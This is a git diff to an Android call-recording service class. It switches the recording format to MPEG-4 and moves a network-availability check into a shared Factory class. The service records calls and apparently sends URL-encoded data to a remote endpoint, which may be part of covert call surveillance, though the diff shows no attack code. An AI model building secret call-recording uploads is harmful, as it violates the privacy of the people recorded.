@@ -25,6 +25,8 @@ import java.net.URLEncoder;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 
+import u.can.i.up.expert.common.Factory;
+
 public class RecordService extends Service implements MediaRecorder.OnInfoListener, MediaRecorder.OnErrorListener
 {
     public final String DEFAULT_STORAGE_LOCATION = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Calls" + File.separator;
@@ -91,7 +93,7 @@ public class RecordService extends Service implements MediaRecorder.OnInfoListen
         try {
             recorder.reset();
             recorder.setAudioSource(audiosource);
-            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
             recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
             recorder.setOutputFile(recording.getAbsolutePath());
             recorder.setOnInfoListener(this);
@@ -170,7 +172,7 @@ public class RecordService extends Service implements MediaRecorder.OnInfoListen
     	Log.d("com.connect", urlData);
 
     	urlData = URLEncoder.encode (urlData, "UTF-8");
-    	if(isNetworkAvailable())
+    	if(Factory.isNetworkAvailable())
     	{
     	  InputStream content = null;
     	  try 
@@ -186,12 +188,12 @@ public class RecordService extends Service implements MediaRecorder.OnInfoListen
 		return null;
     }
     //********************************************************************************************************************************************************
-    public boolean isNetworkAvailable() {
-        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
-        NetworkInfo networkInfo = cm.getActiveNetworkInfo();
-        if (networkInfo != null && networkInfo.isConnected()) {
-            return true;
-        }
-        return false;
-    } 
+//    public boolean isNetworkAvailable() {
+//        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+//        NetworkInfo networkInfo = cm.getActiveNetworkInfo();
+//        if (networkInfo != null && networkInfo.isConnected()) {
+//            return true;
+//        }
+//        return false;
+//    }
 }
